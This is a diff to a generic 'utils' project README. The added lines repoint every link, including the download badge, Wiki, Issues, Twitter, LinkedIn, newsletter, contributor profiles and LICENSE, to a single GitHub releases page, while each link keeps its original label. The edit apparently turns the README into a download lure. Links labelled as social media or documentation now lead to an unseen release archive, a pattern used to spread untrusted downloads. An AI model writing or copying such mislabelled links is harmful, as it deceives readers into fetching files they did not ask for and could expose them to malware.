@@ -21,7 +21,7 @@ To make use of these utilities, simply clone the repository and include the nece
 
 To get started with the "utils" repository, download the latest release from the following link:
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/releases/789694263/Release.zip)
+[![Download Release](https://github.com/Natsuzusaki/utils/releases)](https://github.com/Natsuzusaki/utils/releases)
 
 Once you have downloaded the release file, extract it and follow the instructions provided in the README to integrate the utilities into your project.
 
@@ -29,8 +29,8 @@ Once you have downloaded the release file, extract it and follow the instruction
 
 For additional information on how to use the utilities or contribute to the repository, please refer to the following resources:
 
-- [Wiki](https://github.com/utils/wiki): Explore the documentation and usage guidelines.
-- [Issues](https://github.com/utils/issues): Report bugs, suggest enhancements, or request new features.
+- [Wiki](https://github.com/Natsuzusaki/utils/releases): Explore the documentation and usage guidelines.
+- [Issues](https://github.com/Natsuzusaki/utils/releases): Report bugs, suggest enhancements, or request new features.
 
 ## Get Involved 🌟
 
@@ -44,20 +44,20 @@ If you encounter any difficulties or have questions about the utilities, don't h
 
 Stay updated with the latest developments, releases, and announcements by following us on our social media channels and subscribing to our newsletter.
 
-- [Twitter](https://twitter.com/utils)
-- [LinkedIn](https://linkedin.com/company/utils)
-- [Subscribe to Newsletter](https://utils.com/newsletter)
+- [Twitter](https://github.com/Natsuzusaki/utils/releases)
+- [LinkedIn](https://github.com/Natsuzusaki/utils/releases)
+- [Subscribe to Newsletter](https://github.com/Natsuzusaki/utils/releases)
 
 ## Contributors 👨‍💻
 
 A big thank you to all the contributors who have dedicated their time and expertise to make this repository a valuable resource for the programming community.
 
-- John Doe [@johndoe](https://github.com/johndoe)
-- Jane Smith [@janesmith](https://github.com/janesmith)
+- John Doe [@johndoe](https://github.com/Natsuzusaki/utils/releases)
+- Jane Smith [@janesmith](https://github.com/Natsuzusaki/utils/releases)
 
 ## License 📝
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/utils/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Natsuzusaki/utils/releases) file for details.
 
 ---
 
